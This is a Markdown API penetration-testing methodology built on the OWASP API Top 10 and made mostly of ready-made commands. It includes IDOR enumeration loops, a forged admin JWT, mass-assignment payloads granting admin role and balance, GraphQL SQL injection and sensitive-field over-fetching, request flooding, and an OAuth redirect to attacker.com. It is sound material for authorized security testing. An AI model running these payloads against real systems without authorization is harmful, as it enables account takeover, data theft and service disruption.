# API Testing

> Comprehensive API security testing aligned with OWASP API Security Top 10 2023 & 2025‑2026 trends (BOLA/BOPLA, GraphQL over‑fetching, mass assignment, rate‑limit bypass)

## Methodology Overview

Based on OWASP API Security Top 10 2023:
1. **Broken Object Level Authorization (BOLA/IDOR)** – Test resource ID manipulation
2. **Broken Authentication** – JWT flaws, API key leakage, OAuth misconfigs  
3. **Broken Object Property Level Authorization (BOPLA)** – Mass assignment, over‑posting
4. **Unrestricted Resource Consumption** – Rate‑limit testing, DoS
5. **Broken Function Level Authorization** – Admin endpoint access with user tokens
6. **Unrestricted Access to Sensitive Business Flows** – See Business‑Logic.md
7. **Server‑Side Request Forgery (SSRF)** – See SSRF.md
8. **Security Misconfiguration** – Verbose errors, permissive CORS, exposed debug endpoints
9. **Improper Inventory Management** – Shadow/old APIs, internal endpoints
10. **Unsafe Consumption of APIs** – Trusting third‑party responses

## Tool Installation

```bash
# Core tools
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# API‑specific tools
go install github.com/assetnote/kiterunner/cmd/kr@latest           # Context‑aware API fuzzer
pip install arjun                                                   # Hidden parameter discovery
go install github.com/hahwul/dalfox/v2@latest                      # XSS for API endpoints
npm install -g graphql-path-enum                                    # GraphQL enumeration
```

## 1. API Discovery & Reconnaissance

### 1.1 REST API Endpoint Discovery

```bash
# Basic API endpoint discovery
cat https-subs.txt | httpx -silent -threads 100 -path /api/v1,/api/v2,/api/v3,/api/swagger.json,/graphql,/rest,/backend -mc 200,401,403 -cl | tee api-endpoints.txt

# Alternative with ffuf for broader discovery
ffuf -u https://FUZZ.example.com -w /home/pwn/wordlists/api/api-endpoints.txt -mc 200,401,403 -t 50 -o ffuf-api.txt
```

### 1.2 OpenAPI/Swagger Documentation Detection

```bash
# Detect API documentation endpoints
ffuf -u https://target.com/FUZZ -w <(echo -e "swagger.json\nswagger.yaml\nopenapi.json\nopenapi.yaml\napi-docs\napi-docs.json\nswagger-ui.html\nswagger/v1/swagger.json\nv1/swagger.json\nv2/swagger.json\nv3/swagger.json\napi/swagger.json\ndocs/api\napi/docs") -mc 200 -ac -c | tee swagger-found.txt | xargs -I@ curl -s @ | jq -r '.paths | keys[]' 2>/dev/null | anew swagger-paths.txt

# Using httpx for known documentation paths
cat crawledurls.txt | httpx -silent -threads 100 -path /swagger.json,/openapi.json,/api-docs,/swagger-ui.html,/redoc,/docs -mc 200 -cl | awk '{ if ($2 > 986) print $1 }' | anew api-docs.txt
```

### 1.3 JavaScript Analysis for Hidden API Endpoints

```bash
# Extract live JavaScript files
cat crawledurls.txt | grep "\.js" | grep -Ev "\.json|\.jsp" | sort -u | httpx -silent -mc 200,301,302 -threads 200 -o livejslinks.txt

# Extract API endpoints from JS files (modern approach)
cat livejslinks.txt | xargs -I@ curl -s @ | grep -Eo '"(/api/[^"]+|\/v[0-9]+/[^"]+|/graphql[^"]*)"' | sed 's/"//g' | sort -u > js-api-endpoints.txt

# Extract fetch/axios calls with parameters
cat livejslinks.txt | xargs -I@ curl -s @ | grep -Eo 'fetch\(["'"'"'][^"'"'"']+["'"'"']\)|axios\.(get|post|put|delete)\(["'"'"'][^"'"'"']+["'"'"']\)' | sed -E "s/.*['\"]([^'\"]+)['\"].*/\1/" | sort -u > api-calls.txt
```

### 1.4 Hidden Parameter Discovery with Arjun

```bash
# Use Arjun for hidden parameter discovery
arjun -u https://target.com/api/endpoint -o params.json

# Batch process multiple endpoints
cat api-endpoints.txt | xargs -I@ arjun -u @ -o @-params.json 2>/dev/null
```

## 2. API Vulnerability Testing by OWASP Categories

### 2.1 Broken Object Level Authorization (BOLA/IDOR)

```bash
# Test sequential ID manipulation
for id in {100..200}; do curl -s "https://target.com/api/user/$id" -H "Authorization: Bearer $token" | jq '.' | grep -q "email" && echo "Found: $id"; done

# Test UUID pattern (replace with target pattern)
curl -s "https://target.com/api/user/550e8400-e29b-41d4-a716-446655440000" -H "Authorization: Bearer $token" | jq '.'

# Automated IDOR testing with ffuf
ffuf -u https://target.com/api/user/FUZZ -w /home/pwn/wordlists/ids.txt -H "Authorization: Bearer $token" -mc 200 -t 20
```

### 2.2 Broken Authentication

```bash
# JWT testing
curl -s https://target.com/api/auth -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | jq '.'

# Test for missing authentication
curl -s https://target.com/api/admin/users -X GET | grep -E "users|email|id"

# OAuth redirect_uri bypass testing
curl -s "https://target.com/oauth/authorize?response_type=code&client_id=CLIENT&redirect_uri=https://attacker.com"
```

### 2.3 Broken Object Property Level Authorization (BOPLA)

```bash
# Mass assignment testing with extra fields
curl -X POST https://target.com/api/user/update -H "Content-Type: application/json" -d '{"name":"test","email":"test@test.com","role":"admin","is_admin":true}'

# Test PATCH over‑posting
curl -X PATCH https://target.com/api/user/1 -H "Content-Type: application/json" -d '{"balance":999999,"privileged":true}'
```

### 2.4 Unrestricted Resource Consumption (Rate‑Limit Testing)

```bash
# Test rate limits by sending multiple requests
for i in {1..100}; do curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/api/endpoint" & done | sort | uniq -c

# Batch request testing (GraphQL/API)
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__typename}"}' &
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__typename}"}' &
# ... launch many parallel requests
```

### 2.5 Broken Function Level Authorization

```bash
# Test admin endpoints with user token
curl -s https://target.com/api/admin/users -H "Authorization: Bearer $user_token" | jq '.'

# HTTP method override testing
curl -X GET https://target.com/api/admin
curl -X POST https://target.com/api/admin
curl -X PUT https://target.com/api/admin
curl -X DELETE https://target.com/api/admin
```

### 2.6 Security Misconfiguration

```bash
# Check for verbose errors
curl -s "https://target.com/api/user/'" | grep -E "error|exception|stack|trace|mysql|postgres"

# CORS misconfiguration testing
curl -s -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" -X OPTIONS https://target.com/api/endpoint

# Exposed debug endpoints
cat https-subs.txt | httpx -silent -path /debug,/trace,/actuator,/metrics,/health,/info -mc 200
```

## 3. GraphQL‑Specific Testing

### 3.1 GraphQL Endpoint Discovery

```bash
# Detect GraphQL endpoints
cat https-subs.txt | httpx -silent -path /graphql,/api/graphql,/graphql/api,/v1/graphql,/v2/graphql -mc 200,400

# Introspection query to check if enabled
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' | jq '.'
```

### 3.2 GraphQL Introspection & Enumeration

```bash
# Full introspection dump
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputArg}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputArg}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputArg}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputArg on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}' | jq '.' > graphql-introspection.json

# GraphQL path enumeration
graphql-path-enum -u https://target.com/graphql -o graphql-paths.txt
```

### 3.3 GraphQL Injection & Over‑fetching

```bash
# SQL injection in GraphQL arguments
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"query { users(filter: \"'\'' OR 1=1--\") { id name } }"}'

# Over‑fetching sensitive fields
curl -X POST https://target.com/graphql -H "Content-Type: application/json" -d '{"query":"query { users { id email password_hash credit_card } }"}'
```

## 4. Automation & Tool Integration

### 4.1 Nuclei API Scanning

```bash
# Scan API endpoints with Nuclei
cat api-endpoints.txt | httpx -silent -mc 200,201,401,403 | nuclei -t dast/vulnerabilities/ -H "Content-Type: application/json" -rl 20 -c 5 -o api-nuclei-results.txt

# Specific API templates
nuclei -l api-endpoints.txt -t http/api/ -o api-specific-scans.txt
```

### 4.2 Kiterunner Context‑Aware Fuzzing

```bash
# Kiterunner for API endpoint discovery
kr scan https://target.com -w /home/pwn/wordlists/kiterunner/routes-large.kite -x 20 -j -o kr-results.json

# Replay discovered routes
kr brute https://target.com -w /home/pwn/wordlists/kiterunner/routes-large.kite -d 0
```

### 4.3 API‑Specific Wordlist Generation

```bash
# Generate custom wordlist from discovered endpoints
cat js-api-endpoints.txt | awk -F '/' '{print $NF}' | sort -u > api-words.txt

# Combine with common API parameters
cat api-words.txt /home/pwn/wordlists/api/params.txt | sort -u > custom-api-wordlist.txt
```

## 5. References & Further Reading

- **OWASP API Security Top 10 2023**: https://owasp.org/www-project-api-security/
- **PortSwigger API Testing**: https://portswigger.net/web-security/api-testing
- **PayloadsAllTheThings – API**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API
- **GraphQL Security Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- **Kiterunner**: https://github.com/assetnote/kiterunner
- **Arjun – HTTP Parameter Discovery**: https://github.com/s0md3v/Arjun

## 6. Best Practices & Tips

1. **Always test with proper authorization tokens** – Use both low‑privilege and high‑privilege tokens
2. **Focus on business logic** – APIs often expose core business functionality
3. **Test all HTTP methods** – GET, POST, PUT, PATCH, DELETE, OPTIONS
4. **Vary Content‑Type headers** – Test JSON, XML, form‑data, etc.
5. **Look for shadow APIs** – Old versions, internal endpoints, debug interfaces
6. **Automate discovery, manual testing** – Tools find endpoints, humans find bugs

> 🔴 **Warning**: Only test APIs you are authorized to test. Unauthorized testing may violate laws and terms of service.

---
*Based on Web‑Vulnerability‑Testing‑Checklist/API‑Testing.md methodology and 2025‑2026 bug‑bounty trends.*
